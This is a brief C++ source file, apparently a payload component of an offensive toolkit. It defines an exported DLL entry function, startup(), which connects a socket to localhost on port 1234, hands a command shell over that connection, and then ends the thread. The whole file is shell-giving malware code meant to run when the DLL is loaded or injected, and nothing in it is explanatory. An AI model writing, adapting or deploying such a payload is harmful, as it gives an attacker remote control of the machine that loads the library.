#include "../core/external.h"

extern "C" __declspec(dllexport) void startup()
{
    SockConnect("localhost", "1234");
    SockShell();
    ExitThread(0);
}


